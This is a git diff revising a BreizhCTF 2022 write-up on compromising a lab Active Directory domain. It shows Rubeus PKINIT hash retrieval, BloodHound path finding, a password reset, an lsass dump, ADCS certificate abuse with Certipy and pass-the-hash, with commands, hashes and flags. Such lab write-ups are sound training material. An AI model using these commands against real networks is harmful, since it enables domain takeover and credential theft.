@@ -1,5 +1,5 @@
 ---
-title: BreizhCTF 2022 - Bon baisers de Russie 1 & 2
+title: BreizhCTF 2022 - Bons baisers de Russie 1 & 2
 authors: QuentynLemaire,Crypt0-M3lon
 layout: writeup
 ctf_url: https://www.breizhctf.com/
@@ -10,18 +10,17 @@ Category: AD, Pentest
 
 ### Bons baisers de Russie 1/2: 
 
-Le site de vente de tongues était la façade d'un groupe d'APT permettant de fournir les accès VPN à ses utilisateurs ! Utilisez cet accès VPN afin de compromettre, dans un premier temps, le PC ! La donnée à récupérer est sur le bureau d'un des utilisateurs...
-
+> Le site de vente de tongues était la façade d'un groupe d'APT permettant de fournir les accès VPN à ses utilisateurs ! Utilisez cet accès VPN afin de compromettre, dans un premier temps, le PC ! La donnée à récupérer est sur le bureau d'un des utilisateurs...
 
 ### Bons baisers de Russie : 2/2
 
-Avec les accès obtenus sur le PC, vous devriez pouvoir compromettre le contrôleur de domaine ! Récuperez la donnée sur le bureau de l'administrateur du domaine !
-
-Auteur: Kaluche
-
-Note : Le range à attaquer une fois connecté au VPN est 10.0.20.0/24
-
-Format: BZHCTF{}
+> Avec les accès obtenus sur le PC, vous devriez pouvoir compromettre le contrôleur de domaine ! Récuperez la donnée sur le bureau de l'administrateur du domaine !
+> 
+> Auteur: Kaluche
+> 
+> Note : Le range à attaquer une fois connecté au VPN est 10.0.20.0/24
+> 
+> Format: BZHCTF{}
 
 ## Challenge resolution
 
@@ -32,7 +31,7 @@ All the difficulty stands in the poor compatibility of tools with unicode charac
 1. Port scan, identify a web server on the domain controller serving 3 PFX without password
 2. Use PKINIT authentication and UnPAC-the-hash to retrieve NTLM hashes (Rubeus)
 3. Use BloodHound.py with previously retrieved hashes and identify an attack path to the PC1
-4. Use Валерий account to reset ЗИНАИДА password and connect to PC1 as admin and get first flag
+4. Use Валерий owned account to reset Зинаида password and connect to PC1 as admin and get first flag
 5. Dump PC1 lsass memory and get Дарья account password
 6. Use Certipy to enumerate ADCS template and identify that Professor account (Дарья) is allowed to emit certificate with arbitrary SAN
 7. Request a PFX for the Administrator user (администратор in cyrillic) and replay step 2 to get his hash
@@ -212,12 +211,12 @@ By heading towards the domain controller web site on port TCP/80, it is possible
 
 These PFX files contains the certificate with the associated private keys required to authenticate on behalf of those users on the domain `CONTI.RU`.
 
-We tried to use Dirkjanm PKINITTools (https://github.com/dirkjanm/PKINITtools) to get a TGT via PKINIT, but the tool failed to handle unicode characters correctly.
-
 The first step is to get the Alternate Name from the certificates:
 ![PFX details](/assets/breizhctf-22-pfx-details.png)
 
-Next, using `Rubeus` `asktgt` command we can retrieve a TGT and fetch the NTLM hashes of the 3 accounts with `/getcredentials`. Note that PowerShell replace unicode characters by `??????` but it works like a charm:
+Then, we tried to use Dirkjanm [PKINITTools](https://github.com/dirkjanm/PKINITtools) to get a TGT via PKINIT, but the tool failed to handle unicode characters correctly.
+
+Using `Rubeus` `asktgt` command, we can retrieve a TGT and fetch the NTLM hashes of the 3 accounts with `/getcredentials`. Note that PowerShell replace unicode characters by `??????` but it works like a charm:
 
 ```
 PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate:?????????????.pfx /domain:conti.ru /dc:10.0.20.11 /createnetonly:C:\Windows\System32\cmd.exe /getcredentials
@@ -234,7 +233,8 @@ PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate
 [*] Password        : WKQYD994
 [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
 [+] ProcessID       : 4944
-[+] LUID            : 0x33dbab[*] Using PKINIT with etype rc4_hmac and subject: CN=?????
+[+] LUID            : 0x33dbab
+[*] Using PKINIT with etype rc4_hmac and subject: CN=?????
 [*] Building AS-REQ (w/ PKINIT preauth) for: 'conti.ru\?????????????'
 [*] Target LUID : 3398571
 [*] Using domain controller: 10.0.20.11:88
@@ -244,7 +244,7 @@ The error `KRB_AP_ERR_SKEWPS` indicates that we have a time drift with the DC, w
 
 ![Kerberos SKEW](/assets/breizhctf-22-kerberos-skew.png)
 
-Let's try again with clock alligned:
+Let's try again with clock aligned:
 ```
 C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:???????? /certificate:????????.pfx /domain:conti.ru /dc:10.0.20.11 /createnetonly:C:\Windows\System32\cmd.exe  /getcredentials
    ______        _
@@ -311,7 +311,7 @@ It works! We are able to retrieve 3 NTLM hashes for 3 users in `CONTI.RU` domain
 | B              | Вячеслав       | 78DD51AEF64338AD248FF80B25849C44 |
 | C              | Валерий        | BE5C60EC1E9ED48B1ACB5C87D555C6E2 |
 
-We can now gather information on the domain via different tools (smbclient, rpcclient, cme, ...) and perform a BloodHound.py collection to search for privilege escalation paths.
+We can now gather information on the domain via different tools (smbclient, rpcclient, cme, ...) and perform a BloodHound collection to search for privilege escalation paths.
 
 User enumeration with user C:
 ```
@@ -349,12 +349,12 @@ CONTI.RU\Феттаерт                       HR
 CONTI.RU\Ярослав                        Developers' teamlead / OSINT research
 ```
 
-Bloodhound.py (https://github.com/fox-it/BloodHound.py) execution with user C:
+[Bloodhound.py](https://github.com/fox-it/BloodHound.py) execution with user C:
 ```
 $ python bloodhound.py -u Валерий --hashes 00000000000000000000000000000000:BE5C60EC1E9ED48B1ACB5C87D555C6E2 -d CONTI.RU -dc DC1.CONTI.RU -ns 10.0.20.11 -c All
 ```
 
-A path from the owned user ВАЛЕРИЙ (user C) to ЗИНАИДА (let's call him user D), a local admin of `PC1.CONTI.RU` stands out. Indeed, user C has a `GenericAll` permission on user D, which allows password reset:
+A path from the owned user `CONTI.RU\ВАЛЕРИЙ` (user C) to `CONTI.RU\ЗИНАИДА` (let's call him user D), a local admin of `PC1.CONTI.RU` stands out. Indeed, user C has a `GenericAll` permission on user D, which allows password reset:
 ![BloodHound attack path](/assets/breizhctf-22-bloodhound-path.png)
 
 We perform the password reset via `pth-rpcclient` and `setuserinfo2` RPC call:
@@ -366,8 +366,13 @@ E_md4hash wrapper called.
 E_deshash wrapper called.
 ```
 
-From this point, we can connect to `PC1.CONTI.RU` with `ЗИНАИДА` and get the first flag on the desktop:
+From this point, we can connect to `PC1.CONTI.RU` with `CONTI.RU\ЗИНАИДА` and get the first flag on the desktop:
 ![SMBClient first flag](/assets/breizhctf-22-first-flag.png)
+
+```
+$ cat flag.txt    
+BZHCTF{i_hope_you_love_playing_with_cyrillic}
+```
 
 ### Second part
 
@@ -407,7 +412,7 @@ From the BloodHound point of view, this user does not have any interesting privi
 
 We have to find another way to escalate privileges. At the beginning of the challenge, we had to play with PKINIT and PFX. Our nmap scan reveals that there is an ADCS role installed on the domain controller and we didn't look at it yet. Time for ADCS information gathering!
 
-We use Certipy (https://github.com/ly4k/Certipy) excellent tool to enumerate ADCS objects and permissions:
+We use [Certipy](https://github.com/ly4k/Certipy>) excellent tool to enumerate ADCS objects and permissions:
 ```
 $ certipy find -hashes "00000000000000000000000000000000:7a0f1f2a2b2a749312b97777b61cd6a5" 'CONTI.RU/Дарья@10.0.20.11'
 Certipy v2.0.9 - by Oliver Lyak (ly4k)
@@ -427,7 +432,7 @@ Certipy v2.0.9 - by Oliver Lyak (ly4k)
 [*] Saved BloodHound data to '20220401225602_Certipy.zip'. Drag and drop the file into the BloodHound GUI
 ```
 
-User E (RID = 1122 on the domain) found on PC1.CONTI.RU workstation can use the template `UserAfterLeak` to generate certificates (`Enroll` privilege) signed by the `CONTI-DC1-CA` certificate authority. The template has the properties we want to escalate privileges:
+User E (RID = 1122 on the domain) found on `PC1.CONTI.RU` workstation can use the template `UserAfterLeak` to generate certificates (`Enroll` privilege) signed by the `CONTI-DC1-CA` certificate authority. The template has the properties we want to escalate privileges:
 
 - **Client Authentication** so that we can generate certificate to authenticate users
 - **EnrolleeSuppliesSubject** so that we can choose arbitrary Subjet Alternative Name (SAN)
@@ -475,7 +480,7 @@ User E (RID = 1122 on the domain) found on PC1.CONTI.RU workstation can use the 
           "IsInherited": false
       },
       {
-          "PrincipalSID": "S-1-5-21-2511036384-2806266831-3360082211-1122", // <== USER D we own
+          "PrincipalSID": "S-1-5-21-2511036384-2806266831-3360082211-1122", // <== USER E we own
           "PrincipalType": "User",
           "RightName": "Enroll",
           "IsInherited": false
@@ -549,7 +554,7 @@ PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate
        NTLM              : C9876588D1B9FBACAA9A6F8D5642BFA8
 ```
 
-With the administrator NTLM hash, we can connect to the domain controller and grab the second flag:
+With the administrator NTLM hash, we can connect to the domain controller:
 ```
 $ smbclient //10.0.20.11/C$ -U администратор --pw-nt-hash C9876588D1B9FBACAA9A6F8D5642BFA8 -W CONTI.RU
 smb: \> cd Users\администратор\Desktop\
@@ -573,6 +578,8 @@ BZHCTF{pwning_ru_domain_is_fun_no?}
 
 ### Final thoughs
 
-The challenge was not difficult from an Active Directory perspective. However, dealing with cyrillic characters was harden than we though because many tools don't support unicode correctly. We had to alternate Linux and Windows tools to made it.
+The challenge was not difficult from an Active Directory perspective. However, dealing with cyrillic characters was harder than we though because many tools don't support unicode correctly. We had to alternate between Linux and Windows tools to made it.
 
-For instance, when passing the hash with Mimikatz the user name is replaced with litteral `?` during NTLM authentication. On the other side Sharpkatz seemed to work fine, but we had so mess up with lsass memory that nothing was working fine in the VM... On the other side, all linux tools seemed to accept unicode character, expect PKINITTools.
+For instance, when passing the hash with Mimikatz the user name is replaced with litteral `?` during NTLM authentication. On the other side Sharpkatz seemed to work fine, but we had so mess up with lsass memory that nothing was working fine in the VM... On the other side, all linux tools seemed to accept unicode character, but PKINITTools which if we're not mistaking relies on impacket.
+
+Final words go to Kaluche, thanks very much for this challenge, we had a lot of fun!
